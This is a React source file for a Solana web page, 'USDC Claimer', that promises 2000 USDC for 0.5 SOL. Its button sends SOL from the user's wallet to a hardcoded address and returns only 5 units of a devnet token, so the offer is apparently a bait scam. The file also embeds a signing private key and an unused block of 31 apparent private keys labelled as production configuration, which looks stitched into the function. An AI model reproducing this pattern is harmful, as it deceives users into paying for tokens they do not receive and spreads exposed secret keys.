/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3L4Bq5DtPvVRuY5MDPkVw47ZpSkL9Gwjwj2QneLwHjmE6rj3rhzE1nBNy5GCkJdyfL7NjaxkSngV8EKTmg23v1K7"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4zm21jd4w2nyDJdLZJvh57tA1z29UM6PUXUWkfUS3UZu2ZBRyTpUdwXonexWuXrDnabQc5RioJVL2qBXg4wMufcZ",
  "key1": "XXJ4XY3Yikf3GBmpzGiYCZdC8wycvoJ1MAvPwAR4L4guPXxxWWnKENh7MuoTRfJ9PZX2cAHZkFLAyWByoXvLqaa",
  "key2": "4iCfAvbdUPDSyLncKpX9e5x5CduuofpoGS7sgsy1xVCqtABHMAQ4v3LtwSMXyjWtFBDMty8UEfSfgDhCoi97NLoY",
  "key3": "5ZUdwfkWBG6aWQ8pGyKRYHLxko2TVNooAy3j4Meadjwv3wfEcxuvYMFYAieEp9jTiF6UQyrm2Zr6XRrX36G5sTbi",
  "key4": "67X47GcpW8FE21LmG3CA2BVwAHP8QmtJ2eMFnCETxpywvxXg23vaCq5n594HrM87yDpf4kA7SezXC2pqauBmPuE3",
  "key5": "23MmM3NQSP7fHFEuXFnd5ENtDZHzGsibvAUAENmDHTJ1AfMT6SEdh7Zuwpp5cagMHCP3AupzZgeNg1pS4kyUqdH8",
  "key6": "5WfP7VnkiFr5PV5LQvGZHzHPdPaEeSVgwnWoK6pGcfNrHYiMBdpnvFzsdAAJVNDD4diPtu17hBaL3dKdFT8MApw1",
  "key7": "2rp1Aw2mWKRV8jVUDQYPLSrayksuTS5P4XGm9c6RKg2W1QQpTEmqjpWw2avdjoZQUnnLELfwDttWC5RRyQAoiwkr",
  "key8": "mj7xeoBBNt5NQn45DmGEpf7Q3BwwfstnyWJNxR2Ne7p81drNXJn8m13ZQXCW6W1jHS9PcKUKDP9aVDZNsUbSjvU",
  "key9": "2quWUdNVRPJcquyAZedhSstXZoA7EDd6Cwd5ePaTgfnrqoyCod5kenD7tgyiHTEiKGxH4goQgHNARHyWSURfZ7No",
  "key10": "EHJgm3LZJiM91482vT3mCQyuMUvukt7ncZUXH5KSm2bcEh6zDwY7xZhJYDMF2nUjCqzZgKEavNGoBjvFs8MAXt6",
  "key11": "3L3pxLrHpDjnUtKAo7idfiBu7QUof1iqQU4UCHZDWLfA3gBaFZ31G14HbTWSKUuNpkGCrULFrJzMN9seRH9fMdr7",
  "key12": "5ndVw3FB7oJfjY1S2FKgw4J8UkcED1GnvBrSNd7aQuF6SsmZ3De3KeGjk8ak7c4YFPGeq9ks9QDmrKATb4UJhDT5",
  "key13": "4SrBMietRsTGXmX7AYMPHA2Mqczx5EXpTYb1eFe6dKrvgs8dYjGobV1zsocqmYSdD7GCxdPpZhQJraSoxurP8Lpw",
  "key14": "4KhJ5qveiU9ES1UzPUbrxhcBHvJnpF41txQSzYiePhMhVNSezUsKsreXrWSyWZ7HZMU9jCUheAMiDjmUztgiPrhq",
  "key15": "5xYNQT2dnoc8T4mC3XFmSSxp6xaZfTpEinrjkDj8KBhSAtJweFHEXuK6CeqE26Msw2p1ubze3vw68eKe54Upgh8Y",
  "key16": "DnuFnXtWdSfPF7DVDALHhQ2Af4MEi48Cv1GcLJF6hF9tqhj2n8DuSN3vwmonfoR3ufjyvmUM28kUpqpPfy3baBE",
  "key17": "49zpaPhhgKt9srSUH6PKyCeVEj9X1pk92UdB2vAgZbYsY5qyfNd9hHs2oz8DHULmG6sLGcHUwr7VtcpX8s83Wzba",
  "key18": "3oui23zuzDSvhmJ3D5ykGumEEcgjCE2wDdc47qoeY22UXxPaJW9Qw6AW6mGc3cxUHgmoL3KkgXAiWQD7eyqPLtzS",
  "key19": "21xFBN2qtjAuE18tf8x8GYfNi5TAc7dhpZByZCGxr7z9Brse2tjPSVRFsHCCJubdEKEGdyNVkCNqF3ricNziik6q",
  "key20": "2DG91NZufmrDa89E15rqkbdY2mrvX3hBRXXtRtc1x1z28UAnHf7wJfhrLYFBYFxSSswrA7A6H448gBapEg1buVnj",
  "key21": "tErF1pgsfKcpnqWVa2FBimxWgg3RJEztVTdhpKfUhFaqdZ1MKQkhzHqLXJPXGRGene5ZT2EtKUDkLgntbrZLVtC",
  "key22": "t4tRmdMhQsvPmNaXKG5FBEqAc6hCfA8ELuCRy6cPZxba5s91rSJEyF9Ctj3yQdnGfd75kaUNzeKVmA6sec5u85M",
  "key23": "3Wmrg8WWqU1cY4GrQNwMUtmz6GKKaPN6qwVbVypWM2cGAJQuuoCkx3sTcY9ANpdYS4kGvqLHAg1QVVkARduPCNwR",
  "key24": "aaUWgpPupb1TJVfb1g6M8yzS4e2NgCBh7ymaQrzCJdEStVzC3e3cBTaPsm68HBgY8hmuqeQMZpvyVzEU6PCsDMY",
  "key25": "x65Wt4WS1FfFPyCvn7dBWoQgBMseCck6TA5YDDzCPZrst6zeGwreFq1Hd96iw67xfiUdcXSks145LUZZjm9oCNe",
  "key26": "4kKu6sRKn1NJEvhuPRvpJ3HrX6NUpUW4D8RU7SXUmh6ttoLQvvpfVA2y9YRPtEsg8PQ41PvTc98ZCs5pWLeeN65p",
  "key27": "4fnz1rBc8P7sTCoUCQsUEZcVd3Apkdi7sguzzRL5pouptaZbaTRTo5PKPBUaBeCQCFjv3iwcDqWckFMLeFiY83dW",
  "key28": "291LoKNidAbSedTpdiXCuDhUebFrEmmygFeGCMXtDKt7LqcSCbJd9hndx88R7Bon5XwXzF5y1M7eAVqdXQTmbZBq",
  "key29": "BiNf1xC3Yj1TGBUHtkjnaTnpjJWojKASy8M3Yn1pLN5tiAZSkGA5DcfagsU3DmHvVuHHBYsB4rKs6hFYyexKKpC",
  "key30": "48WADJDDpjEf92nUGTVwgm7oonkDfJeCzLh4Gb62XPDrABYpgpdrohbC6fXvPYKS6NBUZq13KBizxcLUCNHcMspZ"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
